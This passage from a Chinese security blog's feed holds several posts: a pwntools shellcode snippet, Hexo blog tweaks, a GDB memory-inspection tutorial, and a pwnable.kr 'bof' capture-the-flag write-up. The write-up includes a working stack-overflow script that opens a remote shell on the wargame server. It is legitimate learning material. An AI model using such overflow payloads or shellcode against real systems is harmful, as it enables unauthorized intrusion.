class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>enhex(asm(shellcraft.setreuid() + shellcraft.dupsh(<span class="number">4</span>))) <span class="comment"># doctest: +ELLIPSIS</span></span><br><span class="line"><span class="string">'6a3158cd80...'</span></span><br></pre></td></tr></table></figure><h4 id="2-dynelf"><a href="#2-dynelf" class="headerlink" title="2.dynelf"></a><font color="blue"><code>2.dynelf</code></font></h4><blockquote><p> <a href="https://docs.pwntools.com/en/stable/dynelf.html" target="_blank" rel="noopener">dynelf 官方文档</a></p></blockquote><p><code>功能</code>：动态解析函数，仅提供指向任何已加载模块的指针，以及一个可以在任何地址泄漏数据的函数。用于远程符号泄露，需要提供leak方法</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、基本模块&quot;&gt;&lt;a href=&quot;#一、基本模块&quot; class=&quot;headerlink&quot; title=&quot;一、基本模块&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;一、基本模块&lt;/font&gt;&lt;/h3&gt;&lt;h4 id=&quot;1-asm-disasm&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="二进制" scheme="https://muzibing.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="Tools" scheme="https://muzibing.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Hexo博客完善（持续更新）</title>
    <link href="https://muzibing.github.io/2020/04/30/2020.04.30%EF%BC%88113%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/04/30/2020.04.30（113）/</id>
    <published>2020-04-29T16:00:00.000Z</published>
    <updated>2020-05-02T09:55:24.609Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/1.png" alt></p><h3 id="font-color-navy0x00-添加置顶功能font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-添加置顶功能font"></a> <font color="navy"><code>0x00 添加置顶功能</code></font></h3><blockquote><p><a href="https://zhwhong.cn/2017/03/23/deal-with-hexo-article-top-problem/" target="_blank" rel="noopener">解决Hexo博客文章置顶问题</a></p></blockquote><ol><li><p>修改Hexo文件夹下的<code>node_modules/hexo-generator-index/lib/generator.js</code>，在生成文章之前进行文章top值排序</p></li><li><p><code>generator.js</code>最终的内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"><span class="keyword">var</span> pagination = <span class="built_in">require</span>(<span class="string">'hexo-pagination'</span>);</span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">locals</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> config = <span class="keyword">this</span>.config;</span><br><span class="line">  <span class="keyword">var</span> posts = locals.posts.sort(config.index_generator.order_by);</span><br><span class="line">  posts.data = posts.data.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(a.top &amp;&amp; b.top) &#123;</span><br><span class="line">          <span class="keyword">if</span>(a.top == b.top) <span class="keyword">return</span> b.date - a.date;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">return</span> b.top - a.top;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(a.top &amp;&amp; !b.top) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(!a.top &amp;&amp; b.top) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">return</span> b.date - a.date;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">var</span> paginationDir = config.pagination_dir || <span class="string">'page'</span>;</span><br><span class="line">  <span class="keyword">return</span> pagination(<span class="string">''</span>, posts, &#123;</span><br><span class="line">    perPage: config.index_generator.per_page,</span><br><span class="line">    layout: [<span class="string">'index'</span>, <span class="string">'archive'</span>],</span><br><span class="line">    format: paginationDir + <span class="string">'/%d/'</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">      __index: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h3 id="font-color-navy0x01-添加上传pdf文件功能font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-添加上传pdf文件功能font"></a> <font color="navy"><code>0x01 添加上传PDF文件功能</code></font></h3><blockquote><p><a href="http://leungyukshing.cn/archives/HexoUploadFile.html" target="_blank" rel="noopener">Hexo 博客上传文件</a></p></blockquote><ol><li><p>首先修改程序配置文件 <code>_config.yml</code> 中的 <strong>post_asset_folder:</strong>，这个选项设置为 <code>True</code>。</p></li><li><p>在 <code>source</code> 文件夹下创建名为 <code>pdf</code> 文件夹，将我们需要上传的本地文件移动到这个文件夹。（如 <code>test.pdf</code>）</p></li><li><p>最后在文章中，按照下面的格式引入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[点击下载文件](/pdf/test.pdf)</span><br></pre></td></tr></table></figure></li><li><p>最后重新 <code>hexo g -d</code> 更新就可以了。</p></li></ol><h3 id="font-color-navy0x02-添加在线浏览pdf文件功能font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-添加在线浏览pdf文件功能font"></a> <font color="navy"><code>0x02 添加在线浏览PDF文件功能</code></font></h3><blockquote><p><a href="http://miracle778.site/pdf-test/pdf-test.html" target="_blank" rel="noopener">hexo中插入pdf解决方法</a></p></blockquote><ol><li><p>将<code>_config.yml</code>中的<code>post_asset_folder</code>选项置为<code>true</code></p></li><li><p>在 <code>source</code> 文件夹下创建名为 <code>pdf</code> 文件夹，将我们需要在线浏览的文件移动到这个文件夹</p></li><li><p>在<code>test.md</code>文件中添加如下代码：<code>(不一定非用object标签，embed、iframe标签也一样)</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">"/pdf/test.pdf"</span> <span class="attr">type</span>=<span class="string">"application/pdf"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"100%"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>data表示你要上传的pdf的路径,使用相对路径，将你要上传的pdf放入第二步生成的test文 件夹<br>type和width就不说了，这里注意height不能设成100%，</p></blockquote></li></ol><h3 id="font-color-navy0x03-添加文章加密功能font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-添加文章加密功能font"></a> <font color="navy"><code>0x03 添加文章加密功能</code></font></h3><blockquote><p><a href="https://github.com/MikeCoder/hexo-blog-encrypt/blob/master/ReadMe.zh.md" target="_blank" rel="noopener">hexo-blog-encrypt</a></p></blockquote><ol><li><p>安装：<code>npm install --save hexo-blog-encrypt</code></p></li><li><p>在 <code>_config.yml</code> 中启用该插件:</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Security</span></span><br><span class="line"><span class="attr">encrypt:</span> <span class="comment"># hexo-blog-encrypt</span></span><br><span class="line"><span class="attr">  abstract:</span> <span class="string">有东西被加密了,</span> <span class="string">请输入密码查看.</span></span><br><span class="line"><span class="attr">  message:</span> <span class="string">您好,</span> <span class="string">这里需要密码.</span></span><br><span class="line"><span class="attr">  tags:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">&#123;name:</span> <span class="string">tagName,</span> <span class="attr">password:</span> <span class="string">密码A&#125;</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">&#123;name:</span> <span class="string">tagName,</span> <span class="attr">password:</span> <span class="string">密码B&#125;</span></span><br><span class="line"><span class="attr">  template:</span> <span class="string">&lt;div</span> <span class="string">id="hexo-blog-encrypt"</span> <span class="string">data-wpm="&#123;&#123;hbeWrongPassMessage&#125;&#125;"</span> <span class="string">data-whm="&#123;&#123;hbeWrongHashMessage&#125;&#125;"&gt;&lt;div</span> <span class="string">class="hbe-input-container"&gt;&lt;input</span> <span class="string">type="password"</span> <span class="string">id="hbePass"</span> <span class="string">placeholder="&#123;&#123;hbeMessage&#125;&#125;"</span> <span class="string">/&gt;&lt;label&gt;&#123;&#123;hbeMessage&#125;&#125;&lt;/label&gt;&lt;div</span> <span class="string">class="bottom-line"&gt;&lt;/div&gt;&lt;/div&gt;&lt;script</span> <span class="string">id="hbeData"</span> <span class="string">type="hbeData"</span> <span class="string">data-hmacdigest="&#123;&#123;hbeHmacDigest&#125;&#125;"&gt;&#123;&#123;hbeEncryptedData&#125;&#125;&lt;/script&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="attr">  wrong_pass_message:</span> <span class="string">抱歉,</span> <span class="string">这个密码看着不太对,</span> <span class="string">请再试试.</span></span><br><span class="line"><span class="attr">  wrong_hash_message:</span> <span class="string">抱歉,</span> <span class="string">这个文章不能被校验,</span> <span class="string">不过您还是能看看解密后的内容.</span></span><br></pre></td></tr></table></figure></li><li><p>将 “<code>password</code>” 字段添加到文章信息头：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World</span><br><span class="line">tags:</span><br><span class="line"><span class="bullet">- </span>作为日记加密</span><br><span class="line">date: 2016-03-30 21:12:21</span><br><span class="line">password: mikemessi</span><br><span class="line">abstract: 有东西被加密了, 请输入密码查看.</span><br><span class="line">message: 您好, 这里需要密码.</span><br><span class="line">wrong<span class="emphasis">_pass_</span>message: 抱歉, 这个密码看着不太对, 请再试试.</span><br><span class="line">wrong<span class="emphasis">_hash_</span>message: 抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.</span><br><span class="line">---</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/1.png&quot; alt&gt;&lt;/p&gt;
&lt;h3 id=&quot;font-color-navy0x00-添加置顶功能font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-添加置顶功能f
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pwnable.kr的奇幻之旅（三）[bof]</title>
    <link href="https://muzibing.github.io/2020/04/29/2020.04.28%EF%BC%88111%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/04/29/2020.04.28（111）/</id>
    <published>2020-04-28T16:00:00.000Z</published>
    <updated>2020-04-30T03:24:56.525Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、相关知识"><a href="#一、相关知识" class="headerlink" title="一、相关知识"></a><font color="brown">一、相关知识</font></h3><h4 id="1-pwntools工具"><a href="#1-pwntools工具" class="headerlink" title="1.pwntools工具"></a><font color="navy">1.pwntools工具</font></h4><blockquote><p>最近将会认真的总结一下相关的知识点</p></blockquote><h4 id="2-函数调用在栈中的表现形式"><a href="#2-函数调用在栈中的表现形式" class="headerlink" title="2.函数调用在栈中的表现形式"></a><font color="navy">2.函数调用在栈中的表现形式</font></h4><blockquote><p>可以参考<a href="[https://muzibing.github.io/2019/09/24/2019.09.24%EF%BC%8883%EF%BC%89/](https://muzibing.github.io/2019/09/24/2019.09.24（83）/">这里</a>)</p></blockquote><h4 id="3-栈保护机制相关知识点"><a href="#3-栈保护机制相关知识点" class="headerlink" title="3.栈保护机制相关知识点"></a><font color="navy">3.栈保护机制相关知识点</font></h4><blockquote><p>将会和其他知识进行总结</p></blockquote><h3 id="二、题目分析"><a href="#二、题目分析" class="headerlink" title="二、题目分析"></a><font color="brown">二、题目分析</font></h3><blockquote><p>① 首先检查<code>bof</code>文件的类型，发现它是一个32位的ELF文件</p></blockquote><p><img src="/images/111-1.jpg" alt></p><blockquote><p>② 然后查看<code>bof</code>文件开了什么保护，可以得出相关的保护基本能开的都开了，这让我一个小白如何是好？接下来先看看源码。</p></blockquote><p><img src="/images/111-2.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RELRO:    Partial RELRO    =&gt;对GOT表具有写权限</span><br><span class="line">Stack:    Canary found=&gt;开启了金丝雀保护，具有cookie</span><br><span class="line">NX:       NX enabled=&gt;栈不可执行</span><br><span class="line">PIE:      PIE enabled=&gt;开启了内存地址随机化</span><br></pre></td></tr></table></figure><blockquote><p>③ 在IDA-32进行<code>F5</code>逆向，得到如下的伪代码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*main函数*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  func(<span class="number">-559038737</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*fun函数*/</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">func</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+1Ch] [bp-2Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+3Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">-889275714</span> )</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Nah.."</span>);</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>打开<code>bof.c</code>文件，得到bof的源代码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">gets(overflowme);<span class="comment">// smash me!</span></span><br><span class="line"><span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">func(<span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>④ 画出<code>overflowme</code>、<code>key</code>以及其他参数变量在<code>stack</code>中的位置，如下图：</p></blockquote><p><img src="/images/111-3.png" alt></p><blockquote><p>⑤ 发现，如果将传入的<code>0xdeadbeef</code>通过栈溢出换成<code>0xcafebabe</code>，而且在程序里面已经有调用<code>system(&quot;/bin/sh&quot;)</code>的语句，只要替换成功就能调用，那上面的保护基本也没什么意义嘛。</p></blockquote><p><img src="/images/111-4.jpg" alt></p><blockquote><p>⑥ 那么我们就可以利用<code>pwntools</code>工具进行攻击</p></blockquote><h3 id="三、解题步骤"><a href="#三、解题步骤" class="headerlink" title="三、解题步骤"></a><font color="brown">三、解题步骤</font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">"i386"</span>,os=<span class="string">"linux"</span>,endian=<span class="string">"little"</span>)</span><br><span class="line">r = remote(<span class="string">"pwnable.kr"</span>,<span class="number">9000</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">52</span> + str(p32(<span class="number">0xcafebabe</span>),encoding=<span class="string">"unicode_escape"</span>)<span class="comment"># 52 = 0x2c + 8</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>运行上述代码，然后就<code>ls -l</code>，就可以查看相关文件的权限，其中<code>flag</code>文件有读的权限如下图：</p></blockquote><p><img src="/images/111-5.png" alt></p><blockquote><p><code>cat flag</code>得到flag</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、相关知识&quot;&gt;&lt;a href=&quot;#一、相关知识&quot; class=&quot;headerlink&quot; title=&quot;一、相关知识&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;一、相关知识&lt;/font&gt;&lt;/h3&gt;&lt;h4 id=&quot;1-pwntools工具&quot;&gt;&lt;a href=
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>GDB常用命令-内存查看（x）</title>
    <link href="https://muzibing.github.io/2020/04/28/2020.04.27%EF%BC%88110%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/04/28/2020.04.27（110）/</id>
    <published>2020-04-27T16:00:00.000Z</published>
    <updated>2020-05-06T13:46:14.016Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-功能说明font"><a class="markdownIt-Anchor" href="#font-color-brown一-功能说明font"></a> <font color="brown">一、功能说明</font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">它是按一定格式显示内存地址或变量的值</span><br></pre></td></tr></table></figure><h3 id="font-color-brown二-格式font"><a class="markdownIt-Anchor" href="#font-color-brown二-格式font"></a> <font color="brown">二、格式</font></h3><blockquote><p>x    /(length)(format)(size)    addr</p></blockquote><p><code>例如</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* file : test.c */</span></span><br><span class="line"><span class="comment">/* gcc -o test test.c -g */</span></span><br><span class="line"><span class="comment">/* gdb ./test */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> arr[] = <span class="string">"123456789ABCDEF"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ gdb test</span><br><span class="line">(gdb) <span class="keyword">break</span> main</span><br><span class="line">(gdb) run</span><br><span class="line">Breakpoint <span class="number">1</span>, main (argc=<span class="number">1</span>, argv=<span class="number">0x7fffffffe4f8</span>) at test.c:<span class="number">2</span></span><br><span class="line"><span class="number">2</span>           <span class="keyword">char</span> arr[] = <span class="string">"123456789ABCDEF"</span>;</span><br><span class="line">(gdb) next</span><br><span class="line"><span class="number">3</span>           <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">(gdb) x arr</span><br><span class="line"><span class="number">0x7fffffffe400</span>: <span class="number">0x34333231</span></span><br><span class="line">(gdb) x /c arr</span><br><span class="line"><span class="number">0x7fffffffe400</span>: <span class="number">49</span> <span class="string">'1'</span></span><br><span class="line">(gdb) x /<span class="number">5</span>c arr</span><br><span class="line"><span class="number">0x7fffffffe400</span>: <span class="number">49</span> <span class="string">'1'</span>  <span class="number">50</span> <span class="string">'2'</span>  <span class="number">51</span> <span class="string">'3'</span>  <span class="number">52</span> <span class="string">'4'</span>  <span class="number">53</span> <span class="string">'5'</span></span><br><span class="line">(gdb) x /<span class="number">5</span>xb arr</span><br><span class="line"><span class="number">0x7fffffffe400</span>: <span class="number">0x31</span>    <span class="number">0x32</span>    <span class="number">0x33</span>    <span class="number">0x34</span>    <span class="number">0x35</span></span><br><span class="line">(gdb) x /gx arr</span><br><span class="line"><span class="number">0x7fffffffe400</span>: <span class="number">0x3837363534333231</span></span><br><span class="line">(gdb) x /<span class="number">5</span>i $pc</span><br><span class="line">=&gt; <span class="number">0x4004c9</span> &lt;main+<span class="number">39</span>&gt;:  mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">   <span class="number">0x4004ce</span> &lt;main+<span class="number">44</span>&gt;:  pop    %rbp</span><br><span class="line">   <span class="number">0x4004cf</span> &lt;main+<span class="number">45</span>&gt;:  retq   </span><br><span class="line">   <span class="number">0x4004d0</span> &lt;__libc_csu_init&gt;:  push   %r15</span><br><span class="line">   <span class="number">0x4004d2</span> &lt;__libc_csu_init+<span class="number">2</span>&gt;:        mov    %edi,%r15d</span><br></pre></td></tr></table></figure><h3 id="font-color-brown三-参数说明font"><a class="markdownIt-Anchor" href="#font-color-brown三-参数说明font"></a> <font color="brown">三、参数说明</font></h3><table><thead><tr><th>length</th><th style="text-align:left">format</th><th style="text-align:left">size</th></tr></thead><tbody><tr><td>b（byte）：字节（8位）<br>h（halfword）：半字（16位）<br>w（word）：字（32位）<br>g（giant word）：双字（64位）</td><td style="text-align:left">o（octal） 八进制<br>x（hexadecimal）十六进制 <br>d（decimal） 十进制<br>u（unsigned decimal） 无符号十进制<br>t（binary） 二进制 <br>f（floating point ）浮点数 <br>a（address） 地址 <br>c（char） 字符 <br>s（string） 字符串 <br>i（instruction） 指令</td><td style="text-align:left">任意长度</td></tr></tbody></table><p><code>地址参数相关说明</code>：</p><blockquote><p>地址可为表达式/直接地址，其结果为内存地址。例如可用寄存器（<code>$eip</code>）或伪寄存器（<code>$pc</code>）。若<code>x</code>指令后没有地址表达式，则显示结果为上一次地址。</p></blockquote><h3 id="font-color-brown四-参考文章font"><a class="markdownIt-Anchor" href="#font-color-brown四-参考文章font"></a> <font color="brown">四、参考文章</font></h3><p><a href="http://www.hh-yzm.com/index.php/archives/33/#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B" target="_blank" rel="noopener">GDB常用命令 - 内存查看</a></p><h3 id="font-color-brown五-gdb其他命令font"><a class="markdownIt-Anchor" href="#font-color-brown五-gdb其他命令font"></a> <font color="brown">五、GDB其他命令</font></h3><p><object data="/pdf/GDB命令参考手册.pdf" type="application/pdf" width="100%" height="400"></object></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-功能说明font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-功能说明font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、功能说明&lt;/font&gt;&lt;/
      
    
    </summary>
    
      <category term="Tools" scheme="https://muzibing.github.io/categories/Tools/"/>
    
    
      <category term="GDB" scheme="https://muzibing.github.io/tags/GDB/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr的奇幻之旅（一）[fd]</title>
    <link href="https://muzibing.github.io/2020/04/23/2020.04.23%EF%BC%88108%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/04/23/2020.04.23（108）/</id>
    <published>2020-04-22T16:00:00.000Z</published>
    <updated>2020-04-24T03:42:57.034Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-相关知识font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-相关知识font"></a> <font color="navy"><code>0x00 相关知识</code></font></h3><h4 id="font-colorblue1atoi函数font"><a class="markdownIt-Anchor" href="#font-colorblue1atoi函数font"></a> <font color="blue"><code>1.atoi()函数</code></font></h4><blockquote><p>① atoi函数是包含在stdlib.h标准库中</p><p>② 函数的声明：int atoi(const char* str)</p><p>③ 作用：是用来将参数中的str所指向的字符串转化为一个整数</p><p>④ 实例如下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* s1 = <span class="string">"Hello World"</span>;</span><br><span class="line"><span class="keyword">char</span>* s2 = <span class="string">"1234567890"</span>;</span><br><span class="line"><span class="keyword">char</span>* s3 = <span class="string">"Th1s_1s_a_t9st"</span>;</span><br><span class="line">    <span class="keyword">char</span>* s4 = <span class="string">"a"</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,atoi(s1));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,atoi(s2));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,atoi(s3));</span><br><span class="line">    <span class="built_in">printf</span>(<span 